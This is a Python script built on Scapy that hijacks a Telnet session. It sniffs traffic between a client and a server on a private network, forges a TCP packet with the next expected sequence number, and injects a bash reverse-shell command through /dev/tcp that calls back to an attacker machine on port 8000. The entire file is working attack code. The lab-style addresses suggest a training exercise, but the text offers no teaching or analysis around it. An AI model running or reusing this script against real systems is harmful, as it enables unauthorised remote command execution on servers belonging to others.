from scapy.all import *
import time

# Target connection info
client_ip = "192.168.1.9"     # Telnet client (victim)
server_ip = "192.168.1.10"    # Telnet server
server_port = 23              # Telnet
iface = "eth0"                # Change to wlan0 if on Wi-Fi

# Command to inject (must end with newline for telnet/netcat)
command = "b\n/bin/bash -i >& /dev/tcp/192.168.1.8/8000 0>&1\n"

def log(msg, data={}):
    print(f"[+] {msg} {' '.join([f'{k}={v}' for k,v in data.items()])}")

# Packet filter: client-to-server packet
def is_target_packet(pkt):
    return (pkt.haslayer(IP) and pkt.haslayer(TCP) and
            pkt[IP].src == client_ip and
            pkt[IP].dst == server_ip and
            pkt[TCP].dport == server_port)

# Inject command with spoofed packet
def inject_command(pkt):
    ip = pkt[IP]
    tcp = pkt[TCP]

    # Use correct sequence and ack
    seq = tcp.seq + len(tcp.payload)  # next expected seq
    ack = tcp.ack

    spoofed_pkt = IP(src=ip.src, dst=ip.dst)/TCP(sport=tcp.sport, dport=tcp.dport, seq=seq, ack=ack,flags="A")/Raw(load=command)

    log("Injecting command", {"src": ip.src, "dst": ip.dst, "seq": seq, "ack": ack, "cmd": command.strip()})
    send(spoofed_pkt, verbose=0)
    return True  # Stop sniffing after first injection

# Start sniffing and inject once
if __name__ == "__main__":
    log("Sniffing for session", {"iface": iface})
    sniff(
        iface=iface,
        filter=f"tcp and src host {client_ip} and dst host {server_ip} and dst port {server_port}",
        prn=inject_command,
        stop_filter=inject_command,
        store=False
    )
